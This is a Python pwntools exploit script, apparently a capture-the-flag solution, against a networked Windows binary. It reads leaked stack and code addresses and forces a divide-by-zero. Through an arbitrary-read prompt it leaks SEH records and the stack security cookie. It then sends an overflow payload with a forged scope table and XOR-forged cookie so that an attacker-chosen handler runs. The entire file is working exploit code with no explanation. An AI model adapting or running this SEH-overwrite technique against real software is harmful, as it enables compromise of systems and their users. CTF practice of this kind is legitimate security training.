#encoding=utf-8

import sys, os
from struct import *
from pwn import *
import binascii 

def padding(x):
    return hex(x)[2:].upper().rjust(8, '0')

main_re = 0
main_loc = 0x40395E
stack_re = 0
stack_loc = 0x19FF00

# context.log_level = "DEBUG"
# p = remote("121.40.159.66", 6666)
p = remote("192.168.1.5", 10001)

### get main_re & stack_re
p.recvuntil("stack address =")
stack_re = int(p.recvuntil('\n').strip(), 16)
p.recvuntil("main address =")
main_re = int(p.recvuntil('\n').strip(), 16)

log.success('stack_re: ' + hex(stack_re))
log.success('main_re:' + hex(main_re))

stack_diff = - stack_loc + stack_re

### div 0 
div_0 = 0x00408551 - main_loc + main_re
p.recvuntil('did you know?')
p.sendline(padding(div_0))
log.info('div_0: ' + hex(div_0))
log.info('div_0 str: ' + padding(div_0))


### leak
def leak(addr):
    p.recvuntil('know more?\r\n')
    p.sendline('yes')
    p.recvuntil('want to know?\r\n')
    p.sendline(str(addr)) 
    p.recvuntil('value is ')
    data = p.recvuntil('\n').strip()
    return int(data, 16)

# leak stack 
p_prev_seh = 0x019FED0 + stack_diff
p_seh_handler = 0x019FED4 + stack_diff
prev_seh = leak(p_prev_seh)
seh_handler = leak(p_seh_handler)

log.success("prev_seh: " + hex(prev_seh))
log.success("seh_handler: " + hex(seh_handler))

p_seh_0 = p_prev_seh - 12
p_seh_1 = p_prev_seh - 8
p_seh_2 = p_prev_seh - 4
seh_0 = leak(p_seh_0)
seh_1 = leak(p_seh_1)
seh_2 = leak(p_seh_2)

log.info(hex(seh_1))
log.info(hex(seh_2))

# leak sec_cookie
p_sec_cookie = 0x047C004 - main_loc + main_re
sec_cookie = leak(p_sec_cookie)

log.success("sec_cookie: " + hex(sec_cookie))

### contrcut scope_table
goal = 0x0408266 - main_loc + main_re 
scope_table = p32(0xFFFFFFE4) \
    + p32(0) + p32(0xFFFFFF0C) \
    + p32(0) + p32(0x0FFFFFFFE) \
    + p32(0x408224 - main_loc + main_re) \
    + p32(goal) # handler
scope_table_len = len(scope_table)

log.info('scope_table_len: ' + hex(scope_table_len))

p.recvuntil('know more?\r\n')
p.sendline('a' * 8)

### payload 
buf = 0x19fe34 + stack_diff
ebp = 0x19fee0 + stack_diff

assert ebp ^ sec_cookie == seh_0

payload = 'a' * 0x20 + scope_table \
    + 'a' * (144 - (0x20 + scope_table_len)) \
    + p32(seh_0) + p32(seh_1) + p32(seh_2)\
    + p32(prev_seh) + p32(seh_handler) \
    + p32(sec_cookie ^ (buf + 0x20)) + p32(0)

p.sendline(payload)

p.recvuntil('know more?\r\n')
p.sendline('yes')
p.recvuntil('want to know?\r\n')
p.sendline('0')

print(p.recv())
